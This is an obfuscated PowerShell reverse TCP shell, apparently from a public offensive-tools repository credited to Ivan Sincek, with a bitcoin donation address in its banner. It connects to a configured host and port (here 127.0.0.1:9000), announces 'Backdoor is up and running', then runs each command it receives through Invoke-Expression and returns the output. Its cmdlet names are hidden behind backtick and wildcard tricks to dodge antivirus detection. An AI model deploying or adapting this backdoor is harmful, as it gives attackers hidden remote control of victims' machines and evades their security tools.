$a1 = "127"; $a2 = "0"; $a3 = "0"; $a4 = "1";
$p1 = 1000; $p2 = 1000; $p3 = 1000; $p4 = 6000;
$a = $a1 + "." + $a2 + "." + $a3 + "." + $a4;
$p = $p1 + $p2 + $p3 + $p4;
$s = $null;
try {
	$s = (& (`G`C`M *ke-E*) '& (`G`C`M *w-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
} catch {
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
	exit(0);
}
& (`G`C`M *e-Ho??) "########################################################################";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "#                        PowerShell Reverse TCP                        #";
& (`G`C`M *e-Ho??) "#                                          by Ivan Sincek              #";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
& (`G`C`M *e-Ho??) "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "########################################################################";
& (`G`C`M *e-Ho??) "Backdoor is up and running...";
$st = $s.GetStream();
$w = (& (`G`C`M *ke-E*) '& (`G`C`M *w-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($st)');
$w.AutoFlush = $true;
$b = & (`G`C`M *w-O*) Byte[] (1000 + 12 + 12);
$e = & (`G`C`M *w-O*) Text.AsciiEncoding;
$d = "";
$r = "";
try {
	do {
		$w.Write("PS(I)>");
		do {
			$r = $st.Read($b, 0, 1000 + 12 + 12);
			if ($r -gt 0) {
				$d = $d + $e.GetString($b, 0, $r).Replace("`r`n", "").Replace("`n", "");
			} else {
				$d = "exit";
			}
		} while ($st.DataAvailable);
		if ($d -ne "" -and $d -ne "exit") {
			try {
				$r = (& (`G`C`M *ke-E*) $d | & (`G`C`M *ut-S*));
			} catch {
				$r = $_.Exception.InnerException.Message;
			}
			$w.WriteLine($r);
			$d = "";
			$r = "";
			$b.Clear();
		}
	} while ($d -ne "exit");
} catch {
	& (`G`C`M *e-Ho??) "";
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
}
$d = "";
$r = "";
$b.Clear();
$w.Close();
$w.Dispose();
$st.Close();
$s.Close();
